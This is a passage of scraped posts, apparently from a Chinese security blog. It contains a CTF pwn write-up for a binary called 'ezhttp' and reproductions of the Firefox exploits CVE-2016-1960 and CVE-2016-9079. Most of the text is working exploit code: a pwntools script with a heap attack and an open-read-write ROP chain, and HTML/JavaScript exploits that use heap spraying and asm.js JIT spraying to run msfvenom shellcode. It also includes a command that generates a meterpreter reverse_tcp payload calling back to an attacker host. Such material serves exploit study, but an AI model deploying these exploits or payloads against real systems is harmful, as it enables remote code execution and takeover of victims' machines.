hex(libc_base))\tenviron = libc_base + libc.sym[&#x27;_environ&#x27;]\tli(&#x27;environ: &#x27; + hex(environ))\t\t# leak stack\t\tdb()\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\t\telse:\t\tcontext.log_level=&#x27;debug&#x27;\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n太菜了….\n更新基于以上泄漏, 我们先泄漏通过environ泄漏stack的input地址, 通过修改exit的的got表中的地址实现劫持, 但是程序开了沙箱, 只能采用orw来打, 比较麻烦的是, 采用开辟堆来实现, 那也不行, 有特殊字符截断,  只能在堆栈中构造rop链,  我在libc中找了好久, 还有调了好久, 才找到一个方法实现….太菜了….\n如何在堆栈中构造rop链并触发.\n\n首先我们先看下程序.\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  char *cont; // [rsp+8h] [rbp-1838h]  char method; // [rsp+10h] [rbp-1830h]  char url; // [rsp+20h] [rbp-1820h]  char content; // [rsp+30h] [rbp-1810h]  char input; // [rsp+830h] [rbp-1010h]  unsigned __int64 v9; // [rsp+1838h] [rbp-8h]  v9 = __readfsqword(0x28u);  sub_DF0();  sub_E4B();  sandbox();  init_0();  while ( True )  &#123;    puts(&quot;\\n======= Send Http packet to me: ========&quot;);    memset(&amp;input, 0, 0x1000uLL);    if ( (signed int)read(0, &amp;input, 0x1000uLL) &lt; 0 )      puts(&quot;Server error!&quot;);    __isoc99_sscanf((__int64)&amp;input, (__int64)&quot;%s %s %s&quot;, (__int64)&amp;method, (__int64)&amp;url, (__int64)&amp;content);    cont = get_end(&amp;input);                     // cont -&gt; input-&gt;end    if ( strcmp(&amp;method, &quot;GET&quot;) &amp;&amp; strcmp(&amp;method, &quot;POST&quot;) )    &#123;      send_to((__int64)&quot;HTTP/1.1 405 Method Not Allowed&quot;, (__int64)&quot;Method not allowed&quot;);      exit(0);    &#125;       ...\n\n可以看到, 我们输入前部分可以放到method变量地方, 而这个变量可以储存0x10个字符, 若想利用rop, 我们前提是要到控制好rsp在我们的rop上, 那怎么才能控制rsp, 在libc中通过某些指令构造,比如通过pop rsp ret指令,那如何布置该指令呢, 使用该指令控制rsp，必须符合如下结构:\npop_rsp_ret addrtarget_rsp addr\n\n首先, 我们必须至少控制两个地址连续的地址,且ret时指向pop_rsp_ret  addr, 这样执行pop rsp指令时会将rsp指向我们的rop链中.\n也可以采用leave ret指令修改也行, 但是我们得控制rbp, rbp可以采用pop rbp … ret控制.\n那我就采用pop rsp来使我们劫持的exit 函数指向我们的 rop链中, 而rop链也就是我们所输入的堆栈地址那.\n与method变量结合.\n----------------------------------| unuse                              rsp,        we can modify it----------------------------------|unuse----------------------------------|unuse----------------------------------| pop rsp addr in libc                method    we can modify it-----------------------------------addr our input rop chain in stack |           we can modify it\n\n我们先劫持exit函数为main函数中的所输入的地方, 也就是read函数那, 这样就可以实现循环输入到堆栈中而不退出,。先输入 method + 0x8部分, 这样做是因为前面字符不能有’\\x00’截断,我们可以让这个地址设为我们即将要改变rsp指向为我们所输入的rop chain地址,但是我们会面临一个问题, 就是我们输入pop_rsp_ret指令的地址后, 跳到这个地方, 高位地址有我们之前输入的字符, 需要不断缩小来设置为’\\x00’。通过这个构造, 再次修改 exit got表中的值为 我们所够造好的rop, 修改为pop3_ret, 弹掉3个没用变量, 修改rsp为我们的rop链, 在ret到我们的rop chain中, 这样就可以完美利用了。\nexp#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: archlinuxfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;ezhttp&#x27;MODIFY_LD = 0arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;./ld-linux-x86-64.so.2&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path if(MODIFY_LD):\t#os.system(&#x27;cp &#x27; + elf_path + &#x27; &#x27; + elf_path + &#x27;.bk&#x27;)\tchange_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_path\tos.system(change_ld_cmd)\tli(&#x27;modify ld ok!&#x27;)\texit(0)# remote server ip and portserver_ip = &quot;183.129.189.62&quot;server_port = 62002# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(d):\tprint(d)\tp =  b&#x27;POST /create HTTP/1.1 \\r\\n&#x27;\tp += b&#x27;Cookie: user=admin \\r\\n&#x27;\tp += b&#x27;token: \\r\\n&#x27;\tp += b&#x27;\\r\\n&#x27;\tp += b&#x27;content=&#x27;\tp += d\tsa(&#x27;======= Send Http packet to me: ========\\n&#x27;, p)\tdef rm(i):\tp =  b&#x27;POST /del HTTP/1.1 \\r\\n&#x27;\tp += b&#x27;Cookie: user=admin \\r\\n&#x27;\tp += b&#x27;token: \\r\\n&#x27;\tp += b&#x27;\\r\\n&#x27;\tp += b&#x27;index=&#x27; + str(i).encode()\tsa(&#x27;======= Send Http packet to me: ========\\n&#x27;, p)def md(i, d):\tp =  b&#x27;POST /edit HTTP/1.1 \\r\\n&#x27;\tp += b&#x27;Cookie: user=admin \\r\\n&#x27;\tp += b&#x27;token: \\r\\n&#x27;\tp += b&#x27;\\r\\n&#x27;\tp += b&#x27;index=&#x27; + str(i).encode()\tp += b&#x27;&amp;content=&#x27; + d + b&#x27;\\n&#x27;\tsa(&#x27;======= Send Http packet to me: ========\\n&#x27;, p)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tad(b&#x27;A&#x27; * 0x8) # 0\tru(&#x27;0x&#x27;)\tleak = int(ru(&#x27;&quot;&#x27;), 16)\toffset = (0x55555575c260 - 0x555555554000)\tli(&#x27;offset: &#x27; + hex(offset))\telf_base = leak - offset\tp_addr = elf_base + 0x203120\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;elf_base: &#x27; + hex(elf_base))\trm(0)\trm(0)\trm(0)\tli(&#x27;attack to p_addr&#x27;)\t\t# attack to p_addr + 0x10 set chunk 1 -&gt; free_got\tad(p64(p_addr + 0x10)) # 1\tad(b&#x27;A&#x27; * 0x8) # 2\tfree_got = elf_base + elf.got[&#x27;free&#x27;]\tli(&#x27;free_got: &#x27; + hex(free_got))\tad(p64(free_got)) # 3\tli(&#x27;p_addr: &#x27; + hex(p_addr))\t\trm(0)\trm(0)\trm(0)\tli(&#x27;modify free_got as puts plt&#x27;)\tmd(1, p64(elf_base + elf.plt[&#x27;puts&#x27;])[0:6])\tli(&#x27;attack to p_addr set chunk2 as atoi got&#x27;)\tad(p64(p_addr + 0x20)) # 1\tad(b&#x27;A&#x27; * 0x8) # 2\tad(p64(elf_base + elf.got[&#x27;atoi&#x27;])) # 3\t\t# leak libc\trm(2)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tlibc_base = leak - libc.sym[&#x27;atoi&#x27;]\tlibc.address = libc_base\tlibc_environ = libc.sym[&#x27;environ&#x27;]\texit_hook = libc_base + + (0x7ffff7ffdf68 - 0x7ffff7a23000)\tli(&#x27;libc_atoi: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tli(&#x27;environ: &#x27; + hex(libc_environ))\tli(&#x27;_rtld_lock_unlock_recursive : &#x27; + hex(exit_hook))\t#md(3, p64(libc_environ)[0:6])\t#rm(1)\t# recovery chunk 2\tmd(3, p64(p_addr + 0x28)[0:6])\tmd(1, b&#x27;\\x08&#x27;)\tmd(3, p64(p_addr + 0x20)[0:6])\tmd(1, p64(libc_environ)[0:6])\trm(2)\t# leak stack\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tstack_input = leak - (0x7fffffffede8 - 0x7fffffffdce0)\tstack_main = leak\tli(&#x27;stack input: &#x27; + hex(stack_input))\tli(&#x27;stack main: &#x27; + hex(stack_main))\t# modify exit got as loop input\tmd(3, p64(elf_base + elf.got[&#x27;exit&#x27;])[0:6])\tret_n = elf_base +  0x18EB # set run loop again\tmd(1, p64(ret_n)[0:6])\t\tpop4_ret = libc_base + 0x21457\tpop_rsp_ret = libc_base + 0x3960\tp = b&#x27;A&#x27; * 8 + p64(stack_input + 0x10)\tsl(p)\t# clean: rubish\tsla(&#x27;&#125;&#x27;, &#x27;AAAAAAA\\x00&#x27;)\tsl(&#x27;AAAAAA\\x00&#x27;)\tli(&#x27;jmp to: &#x27; + hex(pop4_ret))\tmd(1, p64(pop4_ret)[0:6])\t# rop chain\tp = p64(pop_rsp_ret)\tp += b&#x27;A&#x27; * 8\tlibc_read = libc.sym[&#x27;read&#x27;]\tlibc_open = libc.sym[&#x27;open&#x27;]\tlibc_puts = libc.sym[&#x27;puts&#x27;]\tpop_rdi = libc_base + 0x2154d\tpop_rdx_rsi = libc_base + 0xfe669\tpop_rdx = libc_base + 0x1b96\tflag_addr = stack_input + 0x200\t# ret to here\t# open\tp += p64(pop_rdi) + p64(flag_addr)\tp += p64(pop_rdx_rsi) + p64(0) + p64(0)\tp += p64(libc_open)\t# read\tp += p64(pop_rdi) + p64(4)\tp += p64(pop_rdx_rsi) + p64(0x100) + p64(flag_addr + 0x10)\tp += p64(libc_read)\t# puts\tp += p64(pop_rdi) + p64(flag_addr + 0x10)\tp += p64(libc_puts)\tp = p.ljust(0x200, b&#x27;\\x00&#x27;)\tp += b&#x27;./flag\\x00&#x27;\tli(&#x27;flag here: \\n&#x27;)\tsla(&#x27;ok&#x27;, p)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125;)\t\telse:\t\t\tio = elf.process()\t\telse:\t\tcontext.log_level=&#x27;debug&#x27;\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n输出:\nlogan@arch:~/share/xh/pwn2 » lsdm  exp  ezhttp  ezhttp.i64  ezhttp.o  flag  ld-linux-x86-64.so.2  libc.so.6  plogan@arch:~/share/xh/pwn2 » ./exp[*] &#x27;/home/logan/share/xh/pwn2/ezhttp&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled[*] &#x27;/home/logan/share/xh/pwn2/libc.so.6&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled[+] Starting local process &#x27;/home/logan/share/xh/pwn2/ezhttp&#x27;: pid 22554[*] exploit...b&#x27;AAAAAAAA&#x27;[*] offset: 0x208260[*] leak: 0x55555575c260[*] elf_base: 0x555555554000[*] attack to p_addrb&#x27;0quUUU\\x00\\x00&#x27;b&#x27;AAAAAAAA&#x27;[*] free_got: 0x555555757018b&#x27;\\x18puUUU\\x00\\x00&#x27;[*] p_addr: 0x555555757120[*] modify free_got as puts plt[*] attack to p_addr set chunk2 as atoi gotb&#x27;@quUUU\\x00\\x00&#x27;b&#x27;AAAAAAAA&#x27;b&#x27;\\xb0puUUU\\x00\\x00&#x27;[*] libc_atoi: 0x7ffff7a58ac0[*] libc_base: 0x7ffff7a23000[*] environ: 0x7ffff7dd5098[*] _rtld_lock_unlock_recursive : 0x7ffff7ffdf68[*] stack input: 0x7fffffffdd20[*] stack main: 0x7fffffffee28[*] jmp to: 0x7ffff7a44457[*] flag here:     [*] Switching to interactive mode&quot;,&quot;err_info&quot;:&quot;Method not allowed&quot;&#125;======= Server return: =======HTTP/1.1 405 Method Not AllowedServer: H-ServerDate: Sun, 01 Feb 2222 00:00:00 GMTConnection: closeContent-Type: application/jsonContent-Length: 47&#123;&quot;status&quot;:&quot;ok&quot;,&quot;err_info&quot;:&quot;Method not allowed&quot;&#125;======= Server return: =======HTTP/1.1 405 Method Not AllowedServer: H-ServerDate: Sun, 01 Feb 2222 00:00:00 GMTConnection: closeContent-Type: application/jsonContent-Length: 47&#123;&quot;status&quot;:&quot;ok&quot;,&quot;err_info&quot;:&quot;Method not allowed&quot;&#125;======= Server return: =======HTTP/1.1 200 OKServer: H-ServerDate: Sun, 01 Feb 2222 00:00:00 GMTConnection: closeContent-Type: application/jsonContent-Length: 42&#123;&quot;status&quot;:&quot;ok&quot;,&quot;err_info&quot;:&quot;Edit success!&quot;&#125;======= Send Http packet to me: =============== Server return: =======HTTP/1.1 405 Method Not AllowedServer: H-ServerDate: Sun, 01 Feb 2222 00:00:00 GMTConnection: closeContent-Type: application/jsonContent-Length: 47&#123;&quot;status&quot;:&quot;ok&quot;,&quot;err_info&quot;:&quot;Method not allowed&quot;&#125;======= Server return: =======HTTP/1.1 401 UnauthorizedServer: H-ServerDate: Sun, 01 Feb 2222 00:00:00 GMTConnection: closeContent-Type: application/jsonContent-Length: 43&#123;&quot;status&quot;:&quot;ok&quot;,&quot;err_info&quot;:&quot;You not login!&quot;&#125;flag&#123;test_flag&#125;[*] Got EOF while reading in interactive\n\n\n\nezhttp 思路2第一种方法虽然可行, 但是爆破几率实在太低 1&#x2F; 4096.\n那我们就采用法二,  打通几率 1 &#x2F; 16, 通过修改_IO_2_1_stdout来进行泄漏.\n","categories":["ctf"],"tags":["pwn"]},{"title":"Firefox CVE-2016-1960 复现","url":"/2020/10/05/security/cve/CVE-2016-1960/","content":"FIREFOX-CVE-2016-1960Toolsshellcode2asmjs\nmetasploit\npayload\n受影响firefoxMozilla Firefox &lt; 45\n\n\n\nmsfvenom --payload windows/exec CMD=calc.exe sc2asmjs.py \n\n\n\nmake payloadmsfvenom --payload windows/exec CMD=notepad.exe EXITFUNC=seh -f python -o msf_windows_exec_notepad.py\n\nexp&lt;title&gt;CVE-2016-1960 and ASM.JS JIT-Spray&lt;/title&gt;&lt;head&gt;&lt;meta charset=UTF-8 /&gt;&lt;script&gt;&quot;use strict&quot; var Exploit = function()&#123;    this.asmjs = new Asmjs()    this.heap = new Heap()&#125; Exploit.prototype.go = function()&#123;    /* target address of fake node object */    var node_target_addr = 0x20200000      /* target address of asm.js float pool payload*/    var target_eip = 0x3c3c1dc8     /* spray fake Node objects */    this.heap.spray(node_target_addr, target_eip)     /* spray asm.js float constant pools */    this.asmjs.spray_float_payload(0x1800)     /* go! */    this.trigger_vuln(node_target_addr)&#125;;  Exploit.prototype.trigger_vuln = function(node_ptr)&#123;    document.body.innerHTML = &#x27;&lt;table&gt;&lt;svg&gt;&lt;div id=&quot;AAAA&quot;&gt;&#x27;    this.heap.gc()    var a = new Array()     for (var i=0; i &lt; 0x11000; i++)&#123;        /* array element (Node object ptr) control with integer underflow */        a[i] = new Uint32Array(0x100/4)        for (var j=0; j&lt;0x100/4; j++)            a[i][j] = node_ptr     &#125;     /* original crashing testcase    document.getElementById(&#x27;AAAA&#x27;).innerHTML = &#x27;&lt;title&gt;&lt;template&gt;&lt;td&gt;&lt;tr&gt;&lt;title&gt;&lt;i&gt;&lt;/tr&gt;&lt;style&gt;td&lt;/style&gt;&#x27;;    */     /* easier to exploit codepath */    document.getElementById(&#x27;AAAA&#x27;).innerHTML = &#x27;&lt;title&gt;&lt;template&gt;&lt;td&gt;&lt;tr&gt;&lt;title&gt;&lt;i&gt;&lt;/tr&gt;&lt;style&gt;td&lt;DD&gt;&#x27;;     window.location.reload()&#125;;  var Asmjs = function()&#123;&#125;; Asmjs.prototype.asm_js_module = function(stdlib, ffi)&#123;    &quot;use asm&quot;    var foo = ffi.foo    function payload()&#123;        var val = 0.0        /* Fx 44.0.2 float constant pool of size 0xc0 is at 0xXXXX1dc8*/        val = +foo(            // $ msfvenom --payload windows/exec CMD=calc.exe # transformed with sc2asmjs.py            -1.587865768352248e-263,            -8.692422460804815e-255,            7.529882109376901e-114,            2.0120602207293977e-16,            3.7204662687249914e-242,            4.351158092040946e+89,            2.284741716118451e+270,            7.620699014501263e-153,            5.996021286047645e+44,            -5.981935902612295e-92,            6.23540918304361e+259,            1.9227873281657598e+256,            2.0672493951546363e+187,            -6.971032919585734e+91,            5.651413300798281e-134,            -1.9040061366251406e+305,            -1.2687640718807038e-241,            9.697849844423e-310,            -2.0571400761625145e+306,            -1.1777948610587587e-123,            2.708909852013898e+289,            3.591750823735296e+37,            -1.7960516725035723e+106,            6.326776523166028e+180        )        return +val;    &#125;    return payload&#125;; Asmjs.prototype.spray_float_payload = function(regions)&#123;    this.modules = new Array(regions).fill(null).map(        region =&gt; this.asm_js_module(window, &#123;foo: () =&gt; 0&#125;)    )&#125;; var Heap = function(target_addr, eip)&#123;    this.node_heap = []&#125;;  Heap.prototype.spray = function(node_target_addr, target_eip)&#123;    var junk = 0x13371337    var current_address = 0x08000000    var block_size = 0x1000000    while(current_address &lt; node_target_addr)&#123;        var fake_objects = new Uint32Array(block_size/4 - 0x100)        for (var offset = 0; offset &lt; block_size; offset += 0x100000)&#123;            /* target Node object needed to control EIP  */            fake_objects[offset/4 + 0x00/4] = 0x29             fake_objects[offset/4 + 0x0c/4] = 3            fake_objects[offset/4 + 0x14/4] = node_target_addr + 0x18            fake_objects[offset/4 + 0x18/4] = 1            fake_objects[offset/4 + 0x1c/4] = junk            fake_objects[offset/4 + 0x20/4] = node_target_addr + 0x24            fake_objects[offset/4 + 0x24/4] = node_target_addr + 0x28            fake_objects[offset/4 + 0x28/4] = node_target_addr + 0x2c            fake_objects[offset/4 + 0x2c/4] = target_eip         &#125;        this.node_heap.push(fake_objects)        current_address += block_size    &#125;&#125;; Heap.prototype.gc = function()&#123;    for (var i=0; i&lt;=10; i++)        var x = new ArrayBuffer(0x1000000)&#125;; &lt;/script&gt;&lt;head&gt;&lt;body onload=&#x27;exploit = new Exploit(); exploit.go()&#x27; /&gt;\n\n","categories":["security"],"tags":["cve"]},{"title":"Firefox CVE-2016-9079复现","url":"/2020/10/05/security/cve/CVE-2016-9079/","content":"CVE-2016-9079环境受害者windows 7\n火狐 32bit 50.0.1\n攻击者工具\nshellcode2asmjs\nmetasploit\n影响的版本\nFirefox version &lt; 50.0.2\nFirefox ESR &lt; 45.5.1\nThunderbird &lt; 45.5.1\n\n不受影响的版本\nFirefox version &#x3D; 50.0.2\nFirefox ESR &#x3D; 45.5.1\nThunderbird &#x3D; 45.5.1\n\n火狐浏览器上暴露出一个 JavaScript  0Day漏洞CVE-2016-9079，而且已经被用于攻击 Tor 用户。该漏洞是一个存在于SVG  Animation模块中的释放后重用(UAF)漏洞，当用户使用Firefox浏览包含恶意Javascript和SVG代码的页面时，会允许攻击者在用户的机器上远程执行代码。受该漏洞影响的平台包括Windows，Mac OS以及Linux。\n攻击者通过堆喷射技术在内存中大量分配填充预定义的指令从而绕过地址空间随机化（ASLR）\n生成shellcodemsfvenom --payload windows/meterpreter/reverse_tcp lhost=192.168.43.21 lport=10000 -f python -o msf.py\n\n\n\nshellcode 转换./sc2asmjs.py -l msf.py -t static -o t.html\n\n\n\n将生成的shellcode部分复制替换官方的shellcode\n&lt;!DOCTYPE HTML&gt;&lt;!--    FULL ASLR AND DEP BYPASS USING ASM.JS JIT SPRAY (CVE-2017-5375)    PoC Exploit against Firefox 50.0.1 (CVE-2016-9079 - Tor Browser 0day)    Tested on:    Release 50.0.1 32-bit - Windows 8.1 / Windows 10    https://ftp.mozilla.org/pub/firefox/releases/50.0.1/win32/en-US/Firefox%20Setup%2050.0.1.exe    Howto:    1) serve PoC over network and open it in Firefox 50.0.1 32-bit    2) if you don&#x27;t see cmd.exe, open processexplorer and verify that cmd.exe was spawned by firefox.exe    A successfull exploit attempt should pop cmd.exe    Writeup: https://rh0dev.github.io/blog/2017/the-return-of-the-jit/        (C) Rh0    Jul. 13, 2017--&gt;&lt;script async&gt;function asm_js_module()&#123;    &quot;use asm&quot;;    /* huge jitted nop sled */    function payload_code()&#123;        var val = 0; // shellcode 替换...        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        val = (val + 0xa8909090)|0;        /* 3 byte VirtualAlloc RWX stager */        val = (val + 0xa890db31)|0;        val = (val + 0xa89030b3)|0;        val = (val + 0xa81b8b64)|0;        val = (val + 0xa80c5b8b)|0;        val = (val + 0xa81c5b8b)|0;        val = (val + 0xa8b9006a)|0;        val = (val + 0xa8904c4c)|0;        val = (val + 0xa8902eb1)|0;        val = (val + 0xa85144b5)|0;        val = (val + 0xa8b99090)|0;        val = (val + 0xa8903233)|0;        val = (val + 0xa89045b1)|0;        val = (val + 0xa8514cb5)|0;        val = (val + 0xa8b99090)|0;        val = (val + 0xa8904e52)|0;        val = (val + 0xa8904bb1)|0;        val = (val + 0xa85145b5)|0;        val = (val + 0xa8590e6a)|0;        val = (val + 0xa84fe789)|0;        val = (val + 0xa8086b8b)|0;        val = (val + 0xa820738b)|0;        val = (val + 0xa8471b8b)|0;        val = (val + 0xa82ae349)|0;        val = (val + 0xa890c031)|0;        val = (val + 0xa890ad66)|0;        val = (val + 0xa89c613c)|0;        val = (val + 0xa8077c9d)|0;        val = (val + 0xa890202c)|0;        val = (val + 0xa89c073a)|0;        val = (val + 0xa8d7749d)|0;        val = (val + 0xa890bdeb)|0;        val = (val + 0xa8b9006a)|0;        val = (val + 0xa890636f)|0;        val = (val + 0xa8906cb1)|0;        val = (val + 0xa8516cb5)|0;        val = (val + 0xa8b99090)|0;        val = (val + 0xa890416c)|0;        val = (val + 0xa89075b1)|0;        val = (val + 0xa85161b5)|0;        val = (val + 0xa8b99090)|0;        val = (val + 0xa8907472)|0;        val = (val + 0xa89056b1)|0;        val = (val + 0xa85169b5)|0;        val = (val + 0xa890eb89)|0;        val = (val + 0xa83cc583)|0;        val = (val + 0xa8006d8b)|0;        val = (val + 0xa890dd01)|0;        val = (val + 0xa878c583)|0;        val = (val + 0xa8006d8b)|0;        val = (val + 0xa890dd01)|0;        val = (val + 0xa820458b)|0;        val = (val + 0xa890d801)|0;        val = (val + 0xa890d231)|0;        val = (val + 0xa890e789)|0;        val = (val + 0xa8590d6a)|0;        val = (val + 0xa810348b)|0;        val = (val + 0xa890de01)|0;        val = (val + 0xa890a6f3)|0;        val = (val + 0xa8900de3)|0;        val = (val + 0xa804c283)|0;        val = (val + 0xa890dbeb)|0;        val = (val + 0xa8247d8b)|0;        val = (val + 0xa890df01)|0;        val = (val + 0xa890ead1)|0;        val = (val + 0xa890d701)|0;        val = (val + 0xa890d231)|0;        val = (val + 0xa8178b66)|0;        val = (val + 0xa81c7d8b)|0;        val = (val + 0xa890df01)|0;        val = (val + 0xa802e2c1)|0;        val = (val + 0xa890d701)|0;        val = (val + 0xa8903f8b)|0;        val = (val + 0xa890df01)|0;        val = (val + 0xa890406a)|0;        val = (val + 0xa890c031)|0;        val = (val + 0xa85030b4)|0;        val = (val + 0xa85010b4)|0;        val = (val + 0xa890006a)|0;        val = (val + 0xa890d7ff)|0;        val = (val + 0xa890c931)|0;        val = (val + 0xa89000b5)|0;        val = (val + 0xa890c3b1)|0;        val = (val + 0xa890ebd9)|0;        val = (val + 0xa82434d9)|0;        val = (val + 0xa890e689)|0;        val = (val + 0xa80cc683)|0;        val = (val + 0xa890368b)|0;        val = (val + 0xa85fc683)|0;        val = (val + 0xa890c789)|0;        val = (val + 0xa81e8b66)|0;        val = (val + 0xa81f8966)|0;        val = (val + 0xa802c683)|0;        val = (val + 0xa802c783)|0;        val = (val + 0xa8901e8a)|0;        val = (val + 0xa8901f88)|0;        val = (val + 0xa803c683)|0;        val = (val + 0xa801c783)|0;        val = (val + 0xa803e983)|0;        val = (val + 0xa89008e3)|0;        val = (val + 0xa890cceb)|0;        val = (val + 0xa890e0ff)|0;        val = (val + 0xa824248d)|0;        /* $ msfvenom --payload windows/exec CMD=cmd.exe EXITFUNC=seh */        val = (val + 0xa882e8fc)|0;        val = (val + 0xa8000000)|0;        val = (val + 0xa8e58960)|0;        val = (val + 0xa864c031)|0;        val = (val + 0xa830508b)|0;        val = (val + 0xa80c528b)|0;        val = (val + 0xa814528b)|0;        val = (val + 0xa828728b)|0;        val = (val + 0xa84ab70f)|0;        val = (val + 0xa8ff3126)|0;        val = (val + 0xa8613cac)|0;        val = (val + 0xa82c027c)|0;        val = (val + 0xa8cfc120)|0;        val = (val + 0xa8c7010d)|0;        val = (val + 0xa852f2e2)|0;        val = (val + 0xa8528b57)|0;        val = (val + 0xa84a8b10)|0;        val = (val + 0xa84c8b3c)|0;        val = (val + 0xa8e37811)|0;        val = (val + 0xa8d10148)|0;        val = (val + 0xa8598b51)|0;        val = (val + 0xa8d30120)|0;        val = (val + 0xa818498b)|0;        val = (val + 0xa8493ae3)|0;        val = (val + 0xa88b348b)|0;        val = (val + 0xa831d601)|0;        val = (val + 0xa8c1acff)|0;        val = (val + 0xa8010dcf)|0;        val = (val + 0xa8e038c7)|0;        val = (val + 0xa803f675)|0;        val = (val + 0xa83bf87d)|0;        val = (val + 0xa875247d)|0;        val = (val + 0xa88b58e4)|0;        val = (val + 0xa8012458)|0;        val = (val + 0xa88b66d3)|0;        val = (val + 0xa88b4b0c)|0;        val = (val + 0xa8011c58)|0;        val = (val + 0xa8048bd3)|0;        val = (val + 0xa8d0018b)|0;        val = (val + 0xa8244489)|0;        val = (val + 0xa85b5b24)|0;        val = (val + 0xa85a5961)|0;        val = (val + 0xa8e0ff51)|0;        val = (val + 0xa85a5f5f)|0;        val = (val + 0xa8eb128b)|0;        val = (val + 0xa86a5d8d)|0;        val = (val + 0xa8858d01)|0;        val = (val + 0xa80000b2)|0;        val = (val + 0xa8685000)|0;        val = (val + 0xa86f8b31)|0;        val = (val + 0xa8d5ff87)|0;        val = (val + 0xa80efebb)|0;        val = (val + 0xa868ea32)|0;        val = (val + 0xa8bd95a6)|0;        val = (val + 0xa8d5ff9d)|0;        val = (val + 0xa87c063c)|0;        val = (val + 0xa8fb800a)|0;        val = (val + 0xa80575e0)|0;        val = (val + 0xa81347bb)|0;        val = (val + 0xa86a6f72)|0;        val = (val + 0xa8ff5300)|0;        val = (val + 0xa86d63d5)|0;        val = (val + 0xa8652e64)|0;        val = (val + 0xa8006578)|0;        val = (val + 0xa8909090)|0;        return val|0;    &#125;    return payload_code &#125;&lt;/script&gt;&lt;script&gt;function spray_asm_js_modules()&#123;    sprayed = []    for (var i=0; i&lt;= 0x1800; i++)&#123;        sprayed[i] = asm_js_module()    &#125;&#125;/* heap spray inspired by skylined */function heap_spray_fake_objects()&#123;    var heap = []    var current_address = 0x08000000    var block_size = 0x1000000    while(current_address &lt; object_target_address)&#123;        var heap_block = new Uint32Array(block_size/4 - 0x100)        for (var offset = 0; offset &lt; block_size; offset += 0x100000)&#123;            /* fake object target = ecx + 0x88 and fake vtable*/            heap_block[offset/4 + 0x00/4] = object_target_address            /* self + 4 */            heap_block[offset/4 + 0x14/4] = object_target_address            /* the path to EIP */            heap_block[offset/4 + 0x18/4] = 4            heap_block[offset/4 + 0xac/4] = 1            /* fake virtual function --&gt; JIT target */            heap_block[offset/4 + 0x138/4] = jit_payload_target         &#125;        heap.push(heap_block)        current_address += block_size    &#125;    return heap&#125;/* address of fake object */object_target_address = 0x30300000/* address of our jitted shellcode */jit_payload_target = 0x1c1c0054/* ASM.JS JIT Spray */spray_asm_js_modules()/* Spray fake objects */heap = heap_spray_fake_objects()/* -----&gt; *//* bug trigger ripped from bugzilla report */var worker = new Worker(&#x27;data:javascript,self.onmessage=function(msg)&#123;postMessage(&quot;one&quot;);postMessage(&quot;two&quot;);&#125;;&#x27;);worker.postMessage(&quot;zero&quot;);var svgns = 